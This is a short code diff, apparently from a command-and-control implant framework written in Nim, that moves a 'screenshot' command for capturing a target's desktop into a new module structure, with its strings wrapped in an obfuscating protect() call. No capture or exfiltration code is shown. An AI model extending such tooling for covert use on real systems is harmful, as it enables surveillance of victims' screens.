@@ -3,17 +3,21 @@ import ../common/[types, utils]
 # Define function prototype
 proc executeScreenshot(ctx: AgentCtx, task: Task): TaskResult 
 
-# Command definition (as seq[Command])
-let commands*: seq[Command] =  @[
-    Command(
-        name: protect("screenshot"),
-        commandType: CMD_SCREENSHOT,
-        description: protect("Take a screenshot of the target system."),
-        example: protect("screenshot"),
-        arguments: @[],
-        execute: executeScreenshot
-    )
-]
+# Module definition
+let module* = Module(
+    name: protect("screenshot"), 
+    description: protect("Take and retrieve a screenshot of the target desktop."),
+    commands: @[
+        Command(
+            name: protect("screenshot"),
+            commandType: CMD_SCREENSHOT,
+            description: protect("Take a screenshot of the target system."),
+            example: protect("screenshot"),
+            arguments: @[],
+            execute: executeScreenshot
+        )
+    ]
+)
 
 # Implement execution functions
 when defined(server):
